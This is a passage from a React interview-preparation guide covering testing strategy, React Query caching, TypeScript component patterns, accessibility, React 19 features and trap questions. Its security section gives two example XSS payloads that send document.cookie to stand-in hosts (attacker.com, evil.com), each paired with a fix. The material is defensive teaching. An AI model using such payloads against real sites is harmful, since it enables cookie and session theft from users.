  │   Consistent UI   → Shared design-system MFE or npm package            │
  │   React version   → Module Federation "singleton" scope handles this   │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.17]  QUESTION: "Describe your testing strategy for a large React app."
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ┌──── TESTING PYRAMID ───────────────────────────────────────────────────┐
  │                                                                         │
  │                          ╱ E2E ╲                                        │
  │                         ╱───────╲  5-20 tests                           │
  │                        ╱ Cypress ╲  Critical paths only                 │
  │                       ╱  Playwright╲ Login, checkout, signup            │
  │                      ╱─────────────╲                                    │
  │                     ╱ Integration   ╲  50-200 tests                     │
  │                    ╱  RTL + MSW      ╲ Full component flows             │
  │                   ╱   (mock network)  ╲ Form submit → success           │
  │                  ╱────────────────────╲ Auth guard behavior             │
  │                 ╱  Unit Tests          ╲  200+ tests                    │
  │                ╱   Jest                 ╲ Pure functions                 │
  │               ╱    Custom hooks         ╲ Reducers                      │
  │              ╱     (renderHook)          ╲ Formatters, validators       │
  │             ╱────────────────────────────╲                              │
  │                                                                         │
  │   WHY MSW OVER jest.mock:                                               │
  │   MSW intercepts at network level (Service Worker in browser,           │
  │   Node interceptor in tests). Your actual fetch() code runs.            │
  │   If you change from axios to fetch — tests still pass.                 │
  │   jest.mock('/api') — brittle to HTTP client changes.                   │
  │                                                                         │
  │   WHAT NOT TO TEST:                                                     │
  │   ✗ Snapshot tests of large components  (any change = failure, no signal)│
  │   ✗ That useState updates correctly      (test React, not your code)    │
  │   ✗ Implementation details              (internal state, private fns)   │
  │   ✓ User-visible behavior               (what the user sees + does)     │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.18]  QUESTION: "How does React Query's cache work? Optimistic updates?"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ┌──── REACT QUERY CACHE LIFECYCLE ──────────────────────────────────────┐
  │                                                                         │
  │   Data fetched                                                          │
  │       │                                                                 │
  │       ▼                                                                 │
  │   FRESH  ──(staleTime passes)──► STALE                                  │
  │       │                             │                                   │
  │       │                             │ component mounted                 │
  │       │                             ▼                                   │
  │       │                    background refetch                           │
  │       │                    (show old data while fetching)               │
  │       │                             │                                   │
  │       │                             ▼                                   │
  │       └─────────────────────► UPDATED                                   │
  │                                                                         │
  │   queryClient.invalidateQueries({ queryKey: ['todos'] })                │
  │       → marks matching queries as STALE immediately                     │
  │       → if component mounted: refetch NOW                               │
  │       → if unmounted: refetch on next mount                             │
  │                                                                         │
  │   OPTIMISTIC UPDATE FLOW:                                               │
  │                                                                         │
  │   User clicks "Like"                                                    │
  │         │                                                               │
  │         ▼  onMutate fires BEFORE API call                               │
  │   Cache updated immediately (UI shows liked = true)                     │
  │         │                                                               │
  │         ├── API call in progress...                                     │
  │         │       │                                                       │
  │         │       ├─ SUCCESS → invalidate → refetch to sync              │
  │         │       │                                                       │
  │         │       └─ FAILURE → onError → rollback from context.previous  │
  │         │                                                               │
  │         └── User sees immediate feedback regardless of network          │
  │                                                                         │
  │   USE optimistic updates:  like/unlike, reorder, toggle, quick edits    │
  │   NEVER optimistic:        financial txns, irreversible actions          │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.19]  QUESTION: "Show me a generic component and polymorphic component in TS."
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ┌──── GENERIC COMPONENT ─────────────────────────────────────────────────┐
  │                                                                         │
  │   interface ListProps<T> {                                              │
  │     items: T[];                                                         │
  │     renderItem: (item: T, index: number) => React.ReactNode;            │
  │     keyExtractor: (item: T) => string;                                  │
  │     emptyState?: React.ReactNode;                                       │
  │   }                                                                     │
  │                                                                         │
  │   function List<T>({ items, renderItem, keyExtractor, emptyState }:     │
  │     ListProps<T>) {                                                     │
  │     if (!items.length) return <>{emptyState}</>;                        │
  │     return (                                                            │
  │       <ul>                                                              │
  │         {items.map((item, i) => (                                       │
  │           <li key={keyExtractor(item)}>{renderItem(item, i)}</li>       │
  │         ))}                                                             │
  │       </ul>                                                             │
  │     );                                                                  │
  │   }                                                                     │
  │                                                                         │
  │   // TypeScript infers T from items — no manual annotation needed       │
  │   <List                                                                 │
  │     items={users}                           // T = User                  │
  │     keyExtractor={u => u.id}                                            │
  │     renderItem={u => <span>{u.name}</span>}                             │
  │   />                                                                    │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── POLYMORPHIC COMPONENT ("as" prop) ─────────────────────────────────┐
  │                                                                         │
  │   type PolymorphicProps<C extends React.ElementType> = {                │
  │     as?: C;                                                             │
  │     children: React.ReactNode;                                          │
  │   } & Omit<React.ComponentPropsWithoutRef<C>, 'as' | 'children'>;       │
  │                                                                         │
  │   function Box<C extends React.ElementType = 'div'>({                   │
  │     as,                                                                 │
  │     children,                                                           │
  │     ...props                                                            │
  │   }: PolymorphicProps<C>) {                                             │
  │     const Component = as ?? 'div';                                      │
  │     return <Component {...props}>{children}</Component>;                │
  │   }                                                                     │
  │                                                                         │
  │   // TypeScript enforces correct props per element:                     │
  │   <Box as="button" onClick={...} />    // button props ✅               │
  │   <Box as="a" href="..." />            // anchor props ✅               │
  │   <Box as="button" href="..." />       // href on button? TS error ❌   │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.20]  QUESTION: "What React-specific security vulnerabilities do you watch for?"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  HOW TO SAY IT:
  ┌─────────────────────────────────────────────────────────────────────────┐
  │ "React handles most XSS by default because JSX auto-escapes everything  │
  │  you render as text. The vulnerabilities I watch for are the places     │
  │  where you explicitly opt out of that protection, or where context      │
  │  makes it easy to miss."                                                │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── XSS ATTACK SURFACES IN REACT ─────────────────────────────────────┐
  │                                                                         │
  │   1. dangerouslySetInnerHTML                                            │
  │   ─────────────────────────                                             │
  │   // BAD                                                                │
  │   <div dangerouslySetInnerHTML={{ __html: userInput }} />               │
  │   // Attack: userInput = '<img src=x onerror="fetch(attacker.com/'+     │
  │   //   document.cookie+')">'                                            │
  │                                                                         │
  │   // FIX: sanitize before render                                        │
  │   import DOMPurify from 'dompurify';                                    │
  │   <div dangerouslySetInnerHTML={{                                       │
  │     __html: DOMPurify.sanitize(userInput, {                             │
  │       ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],                         │
  │     })                                                                  │
  │   }} />                                                                 │
  │                                                                         │
  │   2. href / src injection                                               │
  │   ─────────────────────────                                             │
  │   // BAD                                                                │
  │   <a href={user.profileUrl}>Profile</a>                                 │
  │   // Attack: profileUrl = 'javascript:fetch(evil.com/'+cookie+')'       │
  │                                                                         │
  │   // FIX                                                                │
  │   const isSafe = (url) => /^https?:\/\//.test(url);                    │
  │   <a href={isSafe(user.profileUrl) ? user.profileUrl : '#'}>Profile</a>│
  │                                                                         │
  │   3. SSR JSON injection (Next.js)                                       │
  │   ─────────────────────────────                                         │
  │   // BAD                                                                │
  │   <script>window.__DATA__ = {`${JSON.stringify(serverData)}`}</script>  │
  │   // Attack: serverData contains </script><script>alert(1)              │
  │                                                                         │
  │   // FIX: serialize-javascript package or use next/script               │
  │   import serialize from 'serialize-javascript';                         │
  │   <script>window.__DATA__ = {serialize(serverData)}</script>            │
  │                                                                         │
  │   4. Token storage                                                      │
  │   ─────────────────                                                     │
  │   localStorage: JS readable → XSS can steal tokens                      │
  │   HTTP-only cookie: JS cannot read → XSS cannot steal                   │
  │   RULE: Never store refresh tokens in localStorage                      │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.21]  QUESTION: "What accessibility patterns do you implement beyond alt text?"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ┌──── A11Y PATTERNS DIAGRAM ─────────────────────────────────────────────┐
  │                                                                         │
  │   FOCUS MANAGEMENT (Modal example)                                      │
  │   ─────────────────────────────────                                     │
  │   User clicks "Open Modal"                                              │
  │         │                                                               │
  │         ▼                                                               │
  │   Modal mounts → focus trap activates                                   │
  │   first focusable element inside modal gets focus                       │
  │         │                                                               │
  │         │  Tab key → cycles through modal elements only                 │
  │         │  Tab at last element → wraps to first                         │
  │         │  Escape key → closes modal                                    │
  │         ▼                                                               │
  │   Modal unmounts → focus returns to trigger button                      │
  │                                                                         │
  │   ARIA LIVE REGIONS (for dynamic content)                               │
  │   ─────────────────────────────────────                                 │
  │   <div aria-live="polite" aria-atomic="true" className="sr-only">       │
  │     {statusMessage}                                                     │
  │   </div>                                                                │
  │   // Screen reader announces changes to this div                        │
  │   // "polite" = waits for user to finish, "assertive" = interrupts      │
  │   // sr-only = visible to screen readers, hidden visually               │
  │                                                                         │
  │   KEYBOARD NAVIGATION (custom dropdown)                                 │
  │   ─────────────────────────────────────                                 │
  │   Key          Action                                                   │
  │   ──────────   ─────────────────────────────────────────                │
  │   ArrowDown    Focus next option                                        │
  │   ArrowUp      Focus previous option                                    │
  │   Enter/Space  Select focused option                                    │
  │   Escape       Close dropdown, return focus to trigger                  │
  │   Home         Focus first option                                       │
  │   End          Focus last option                                        │
  │   Type chars   Jump to option starting with typed character             │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.22]  QUESTION: "What's new in React 19 and where would you use it?"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  HOW TO SAY IT:
  ┌─────────────────────────────────────────────────────────────────────────┐
  │ "React 19 is mostly about making patterns that were verbose much more   │
  │  ergonomic. The two I'm most excited about are the use() hook and       │
  │  Server Actions — they remove a lot of boilerplate that made async      │
  │  React feel clunky."                                                    │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── REACT 19 KEY ADDITIONS ─────────────────────────────────────────────┐
  │                                                                          │
  │  1. use() — unwrap promises in render (suspends if pending)              │
  │  ────────────────────────────────────────────────────────                │
  │  // BEFORE                        // AFTER                               │
  │  const [data, setData] =          const data = use(fetchDataPromise);    │
  │    useState(null);                // throws to Suspense if pending        │
  │  useEffect(() => {                // throws to ErrorBoundary if error     │
  │    fetch(url).then(r => r.json()) // same for Context:                   │
  │    .then(setData);                const theme = use(ThemeContext);        │
  │  }, []);                          // same as useContext but               │
  │                                   // callable inside if/loops            │
  │                                                                           │
  │  2. Server Actions — server functions called from client                  │
  │  ───────────────────────────────────────────────────────                  │
  │  // actions.ts                                                            │
  │  'use server';                                                            │
  │  export async function createTodo(formData: FormData) {                  │
  │    await db.todos.create({ text: formData.get('text') });                │
  │    revalidatePath('/todos');                                              │
  │  }                                                                        │
  │                                                                           │
  │  // TodoForm.tsx — no API route needed                                    │
  │  <form action={createTodo}>                                               │
  │    <input name="text" />                                                  │
  │    <button type="submit">Add</button>                                     │
  │  </form>                                                                  │
  │                                                                           │
  │  3. useOptimistic — replaces manual onMutate pattern                      │
  │  ────────────────────────────────────────────────────                     │
  │  const [optimisticTodos, addOptimistic] = useOptimistic(todos);           │
  │  // addOptimistic(newTodo) → UI updates instantly                         │
  │  // Reverts automatically if mutation fails                               │
  │                                                                           │
  │  4. useFormStatus — pending state for parent form                         │
  │  ─────────────────────────────────────────────────                        │
  │  function SubmitButton() {                                                │
  │    const { pending } = useFormStatus();                                   │
  │    return <button disabled={pending}>Submit</button>;                     │
  │  }  // must be inside the <form>, not the form component itself           │
  │                                                                           │
  │  5. ref as prop — forwardRef no longer needed                             │
  │  ────────────────────────────────────────────                             │
  │  function Input({ ref, ...props }) {  // just destructure ref            │
  │    return <input ref={ref} {...props} />;                                 │
  │  }                                                                        │
  │                                                                           │
  └──────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.23]  SENIOR TRAP QUESTIONS — WEAK vs STRONG ANSWERS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ┌─────────────────────────────────────────────────────────────────────────┐
  │  Q: "When would you NOT use React?"                                     │
  │  ─────────────────────────────────                                      │
  │  WEAK:  "React is great for everything, I'd always use it."             │
  │  STRONG: "For a simple static blog or marketing site — Astro or         │
  │           11ty is better. Zero JS by default, great for SEO.            │
  │           For a real-time collaborative editor, SolidJS's fine-         │
  │           grained reactivity avoids the virtual DOM overhead at         │
  │           high update rates. For an embeddable widget in a              │
  │           non-React host — Web Components give you zero framework       │
  │           coupling. React is the right default for SPAs and             │
  │           server-rendered apps, not for everything."                    │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌─────────────────────────────────────────────────────────────────────────┐
  │  Q: "Name 5 things that cause React re-renders."                        │
  │  ─────────────────────────────────────────────                          │
  │  WEAK:  "setState and props changing."                                  │
  │  STRONG:                                                                │
  │  ┌──────────────────────────────────────────────────────────────────┐   │
  │  │  CAUSE                          PREVENTABLE?                     │   │
  │  │  ────────────────────────────   ────────────────────────────     │   │
  │  │  1. setState called             No — intended behavior           │   │
  │  │  2. Parent renders              Yes — React.memo on child        │   │
  │  │  3. Context value changes       Yes — split context, useMemo     │   │
  │  │  4. New function/object prop    Yes — useCallback / useMemo      │   │
  │  │  5. useEffect dep changes       Yes — fix dep or useMemo         │   │
  │  │  6. key prop change             Sometimes — audit key logic      │   │
  │  │  7. forceUpdate                 Yes — avoid in new code          │   │
  │  └──────────────────────────────────────────────────────────────────┘   │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌─────────────────────────────────────────────────────────────────────────┐
  │  Q: "Explain the stale closure problem in React."                       │
  │  ─────────────────────────────────────────────                          │
  │  WEAK:  "You use useCallback to fix it."                                │
  │  STRONG: (with diagram)                                                 │
  │                                                                         │
  │   PROBLEM:                                                              │
  │   useEffect(() => {                                                     │
  │     const id = setInterval(() => {                                      │
  │       setCount(count + 1); // "count" is FROZEN at 0                    │
  │     }, 1000);               // Always sets to 1, never 2, 3, 4...       │
  │     return () => clearInterval(id);                                     │
  │   }, []); // empty deps = closure captured at mount, never refreshed    │
  │                                                                         │
  │   ┌─────────────────────────────────────────────────────────────────┐   │
  │   │  Mount time: count=0 → closure captures count=0                 │   │
  │   │  t=1s: setCount(0+1) = 1  ✓                                     │   │
  │   │  t=2s: setCount(0+1) = 1  ✗ (should be 2)                       │   │
  │   │  t=3s: setCount(0+1) = 1  ✗ (stale closure!)                    │   │
  │   └─────────────────────────────────────────────────────────────────┘   │
  │                                                                         │
  │   FIX 1 — functional update (reads current, never stale):               │
  │   setCount(prev => prev + 1);                                           │
  │                                                                         │
  │   FIX 2 — useRef to hold mutable latest value:                          │
  │   const countRef = useRef(count);                                       │
  │   useEffect(() => { countRef.current = count; }); // always fresh       │
  │   setInterval(() => setCount(countRef.current + 1), 1000);              │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌─────────────────────────────────────────────────────────────────────────┐
  │  Q: "What happens when you use random keys on list items?"              │
  │  ─────────────────────────────────────────────────────────              │
  │  WEAK:  "You shouldn't do it because React warns you."                  │
  │  STRONG:                                                                │
  │                                                                         │
  │   key = identity hint to the reconciler                                 │
  │                                                                         │
  │   SAME key across renders:   reconciler REUSES existing DOM node        │
  │   DIFFERENT key:             reconciler DESTROYS + REMOUNTS             │
  │                                                                         │
  │   items.map(i => <Row key={Math.random()} data={i} />)                  │
  │                                                                         │
  │   Render 1:  Row key=0.123  Row key=0.456  Row key=0.789                │
  │   Render 2:  Row key=0.999  Row key=0.111  Row key=0.777                │
  │              ───────────── ALL KEYS DIFFERENT ─────────────             │
  │                                                                         │
  │   React destroys all 3 DOM nodes + remounts 3 fresh ones EVERY render  │
  │   For a list of 1000: 1000 destroy + 1000 mount = 2000 DOM ops/render   │
  │   Local state in rows? Gone on every render.                            │
  │   Input focus? Lost on every render.                                    │
  │                                                                         │
  │   LEGITIMATE use of changing keys:                                      │
  │   <UserProfile key={userId} />  // force fresh mount on user switch     │
  │   // clears all local state — intentional                               │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.25]  ONE-PAGE CHEAT SHEET (Print this page separately)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ╔═══════════════════════════════════════════════════════════════════════╗
  ║  REACT INTERNALS                                                      ║
  ║  Fiber = linked-list of work units, enables pause/resume/priority     ║
  ║  Render phase = interruptible diff. Commit phase = atomic DOM write   ║
  ║  Two trees maintained: current (on screen) + workInProgress (building)║
  ╠═══════════════════════════════════════════════════════════════════════╣
  ║  CONCURRENT MODE                                                      ║
  ║  startTransition → non-urgent setState (deferrable)                   ║
  ║  useTransition   → same + isPending flag for loading UI               ║
  ║  useDeferredValue → lag a value you don't own (received as prop)      ║
  ╠═══════════════════════════════════════════════════════════════════════╣
  ║  SERVER COMPONENTS                                                    ║
  ║  Server = no JS shipped, can await DB directly, no hooks/events       ║
  ║  Client = 'use client', has hooks/events, in browser                  ║
  ║  Rule: Server can hold Client children. Client cannot import Server.  ║
  ╠═══════════════════════════════════════════════════════════════════════╣
  ║  STATE MANAGEMENT DECISION                                            ║
  ║  Server data?      → React Query (cache, stale, invalidate)           ║
  ║  Global UI?        → Zustand / RTK (large team)                       ║
  ║  Shared UI state?  → Context (theme, auth) — split by update freq     ║
  ║  Form state?       → React Hook Form (uncontrolled)                   ║
  ║  URL state?        → Search params (filter, sort, page)               ║
  ╠═══════════════════════════════════════════════════════════════════════╣
  ║  PERFORMANCE RULES                                                    ║
  ║  Profile first — never optimize blind                                 ║
  ║  10k rows → virtualize first (react-window / @tanstack/virtual)       ║
  ║  useCallback is useless without React.memo child or effect dep        ║
  ║  Context re-renders all consumers → split context by update freq      ║
  ╠═══════════════════════════════════════════════════════════════════════╣
  ║  PATTERNS                                                             ║
  ║  Compound Components → UI library (Tabs, Select, Modal)               ║
  ║  Render Props       → renderItem callbacks (lists, tables)            ║
  ║  HOC                → cross-cutting wrap at routing layer             ║
  ║  Custom Hook        → logic sharing (preferred over HOC in new code)  ║
  ╠═══════════════════════════════════════════════════════════════════════╣
  ║  SECURITY                                                             ║
  ║  DOMPurify before dangerouslySetInnerHTML                             ║
  ║  Validate href protocols (block javascript:)                          ║
  ║  Refresh tokens → HTTP-only cookie, never localStorage                ║
  ╠═══════════════════════════════════════════════════════════════════════╣
  ║  STALE CLOSURE FIX                                                    ║
  ║  setCount(prev => prev + 1)  — functional update reads current state  ║
  ║  useRef for mutable latest value in intervals/subscriptions           ║
  ╠═══════════════════════════════════════════════════════════════════════╣
  ║  REACT 19                                                             ║
  ║  use(promise)     → suspends if pending, throws to ErrorBoundary      ║
  ║  Server Actions   → 'use server' fn called from form action prop      ║
  ║  useOptimistic    → instant UI update with automatic rollback         ║
  ║  ref as prop      → forwardRef no longer needed                       ║
  ╠═══════════════════════════════════════════════════════════════════════╣
  ║  KEY NUMBERS                                                          ║
  ║  16ms = 60fps frame budget                                            ║
  ║  50ms = long task threshold (Chrome marks it)                         ║
  ║  staleTime default = 0ms (always stale in React Query)                ║
  ║  gcTime default = 5min (React Query removes cached data)              ║
  ╚═══════════════════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  END OF GUIDE  |  React.js/INTERVIEW_GUIDE.md  |  Sangam Mukherjee
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
